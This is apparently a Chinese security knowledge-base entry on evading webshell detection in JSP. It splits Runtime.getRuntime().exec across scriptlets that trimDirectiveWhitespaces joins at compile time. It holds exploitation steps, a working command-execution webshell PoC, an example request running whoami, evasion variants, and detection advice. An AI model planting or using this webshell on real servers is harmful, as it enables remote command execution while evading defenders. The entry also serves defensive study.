---
id: web-java-rce-jsp-trim-whitespace-fragment-bypass
title: JSP trimDirectiveWhitespaces 拼接 scriptlet 片段绕过 webshell 检测
type: scenario
domain: web
path: web/java/rce
technique: jsp-trim-whitespace-scriptlet-fragment
tags:
- java
- jsp
- webshell
- waf-bypass
- tomcat
- jasper
- scriptlet
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V15
  verified_at: '2026-11-05T01:45:30+08:00'
  notes: 已对照原文与图02/07/08/09/10/11核对：Generator.visit(Node.Scriptlet) 原样打印文本；trimDirectiveWhitespaces=true 丢弃片段间空白使 Runtime/.getRuntime()/.exec 拼接；图11 显示分段；图02 显示未开启时 out.write 中断。原文未声明 JSP/Tomcat 版本区间（JSP 2.1+ 为通用特性）。PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/java/rce/web-java-rce-jsp-trim-whitespace-fragment-bypass/
draft: false
kb_aliases:
- JSP 片段拼接免杀
- trimDirectiveWhitespaces webshell
- scriptlet 分段绕过
- JSP 关键字拆分
- Runtime 分块绕过
---

## 一句话结论

Jasper 会把每个 `<% ... %>` scriptlet 的文本原样写入生成的 Java 文件，并在片段之间写入模板文本；设置 `<%@ page trimDirectiveWhitespaces="true" %>` 可去掉纯空白的模板文本，使多个被 JSP 标签隔开的代码片段在生成的 Java 中直接拼接成 `Runtime.getRuntime().exec(...)`，从而让按原始 JSP 文本做关键字匹配的 WAF 看不到完整危险语句。

## 原理

- JSP 不是直接执行，而是由 Jasper 翻译成 Java servlet 源码再编译。`Generator.visit(Node.Scriptlet)` 的实现是把 scriptlet 的文本 `out.printMultiLn(n.getText())` 原样写入 Java 文件；scriptlet 之间的模板文本（包括换行）通常会被写成 `out.write("\r\n")` 之类的输出语句。
- 如果三个 scriptlet 分别写 `Runtime`、`.getRuntime()`、`.exec(...)`，中间有模板文本/换行，生成的 Java 会变成：
  ```java
  Runtime
  out.write("\r\n");
  .getRuntime()
  out.write("\r\n");
  .exec(request.getParameter("test"));
  ```
  这不是合法 Java，无法编译。
- `trimDirectiveWhitespaces="true"` 会让生成器丢弃“只含空白”的模板文本（`pageInfo.setTrimDirectiveWhitespaces`）。于是相邻 scriptlet 的内容直接连在一起，生成的 Java 变成合法的 `Runtime.getRuntime().exec(request.getParameter("test"));`。
- 从检测角度看，原始 JSP 中的危险关键字被 `<% %>` 标签和空白拆散，简单的行级/正则关键字匹配（如搜索 `Runtime.getRuntime().exec`）不会命中；而容器在编译阶段会把它们还原。
- 该技巧的成立依赖“检测器看原始 JSP 文本，而容器看翻译后的 Java”这一差异；只要检测器实现 JSP 解析/编译或去除标签后再匹配，就会失效。

## 触发条件

- 目标使用 Tomcat/Jasper（或其他支持 `trimDirectiveWhitespaces` 的 JSP 容器，JSP 2.1+）。
- 攻击者能上传/写入 `.jsp` 文件并让容器编译执行。
- WAF/webshell 检测器按原始文件内容做关键字/正则匹配，未做 JSP 语法解析或标签归一化。
- 片段之间的拆分点必须是 Java 词法上可分割的位置（如 `Runtime` 与 `.getRuntime()` 之间、方法名与参数之间）。

## 利用步骤

1. 确认目标可解析 JSP 且 `trimDirectiveWhitespaces` 生效（JSP 2.1+）。
2. 把危险 Java 语句拆成多个 `<% %>` scriptlet，拆分点选在标识符/方法调用边界。
3. 在页面顶部加入 `<%@ page trimDirectiveWhitespaces="true" %>`，确保片段间空白被丢弃。
4. 上传/写入 JSP，访问并传入命令参数。
5. 若返回类型/编译错误，检查生成的 Java 文件（Tomcat work 目录）确认片段是否已正确拼接。

## PoC

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page trimDirectiveWhitespaces='true' %>
<%
Runtime
%>
<%
.getRuntime()
%>
<%
.exec(request.getParameter("test"));
%>
```

```text
# 生成的 Java（trimDirectiveWhitespaces=true）：
Runtime.getRuntime().exec(request.getParameter("test"));

# 若不加 trimDirectiveWhitespaces，生成的 Java 会在片段间插入
# out.write("\r\n")，导致 .getRuntime() / .exec(...) 语法错误。
```

```text
# 访问：
GET /test/test.jsp?test=whoami
# 命令被执行（无回显时需配合回显/外带技巧）
```

## 变体与关联

- 变体：拆分点可换到任意 Java 词法边界，如 `Runtime.getRun` + `time()`、`exec` 与参数之间、`request.getParameter` 与 `("cmd")` 之间。
- 变体：可用 `<%= ... %>` 表达式、JSP 注释 `<%-- --%>`、EL 片段等混合拆分；也可用字符串拼接（`"Run"+"time"`）配合。
- 变体：与 `pageEncoding` 编码绕过、特殊闭合绕过组合使用，形成多层免杀。
- 关联：[[web-java-rce-jsp-pageencoding-static-detection-bypass]]（编码层绕过）；[[web-java-rce-jsp-scriptlet-special-closure-bypass]]（闭合结构绕过）；[[web-java-expression-el-injection-waf-bypass-scanner-echo]]（EL 场景的拼接绕过思路）。
- 边界：容器不支持 `trimDirectiveWhitespaces`、检测器解析 JSP 或先去掉标签/空白再匹配、或上传点禁止 `.jsp` 时失效；片段拼接错误会导致编译失败。

## 检测与防御

- 检测：对上传的 JSP 做语法级解析/编译，而不是只看原始文本；检测多个短 scriptlet 拼接后形成的危险调用；监控 Web 目录新增 `.jsp` 及其编译产物（work 目录中的 Java/class）。
- 修复：禁止上传/写入 JSP；上传目录不可执行；使用白名单文件类型与内容校验。
- 加固：WAF 对 JSP 做标签归一化、解码与编译后分析；对 JSP 文件做完整性基线；限制 Web 目录写权限。
